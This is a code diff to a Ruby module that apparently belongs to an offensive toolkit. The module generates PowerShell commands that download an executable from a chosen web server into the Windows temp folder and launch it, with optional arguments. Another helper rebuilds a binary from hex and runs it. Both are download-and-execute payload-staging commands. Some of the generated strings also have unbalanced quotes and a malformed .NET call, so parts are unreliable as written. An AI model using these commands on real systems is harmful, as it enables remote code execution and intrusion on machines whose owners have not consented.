@@ -17,11 +17,17 @@ module PowershellCommands
     return powershell_command1,powershell_command2
   end
   def powershell_wget_powershell(web_server,executable)
-    powershell_command = %((new-object System.Net.WebClient).DownloadFile('#{web_server}/#{executable}', c:\\windows\\temp\\#{executable}'); Start-Process c:\\windows\\temp\\#{executable}")
+    user_pick = Readline.readline("#{get_input("Would you like to add an argument?[yes/no] ")}",true)
+    if user_pick == 'yes'
+      arguments = Readline.readline("#{get_input("Input the argument: ")}",true)
+      powershell_command = %($arg=#{arguments};$web=new-object System.Net.WebClient;$web.DownloadFile('http://#{web_server}/#{executable}', c:\\windows\\temp\\#{executable}'); Start-Process c:\\windows\\temp\\#{executable} $arg")
+    else
+      powershell_command = %($web=new-object System.Net.WebClient;$web.DownloadFile('http://#{web_server}/#{executable}', c:\\windows\\temp\\#{executable}'); Start-Process c:\\windows\\temp\\#{executable}")
+    end
     return powershell_command
   end
-  def powershell_hex_to_bin(hex,write_path)
-    powershell_command = %($hex_string=#{hex};$byte_array=$hex_string -split '([a-f0-9]{2})' | foreach-object { if ($_) {[System.Convert]::ToByte($_,16)}};[System.IO.WriteAllBytes(#{write_path},$byte_array);Start-Process #{write_path})
+  def powershell_hex_to_bin(read_path,write_path)
+    powershell_command = %($hex_string=[io.file]::ReadAllBytes("#{read_path}");$byte_array=$hex_string -split '([a-f0-9]{2})' | foreach-object { if ($_) {[System.Convert]::ToByte($_,16)}};[System.IO.WriteAllBytes(#{write_path},$byte_array);Start-Process #{write_path})
     return powershell_command
   end
 end
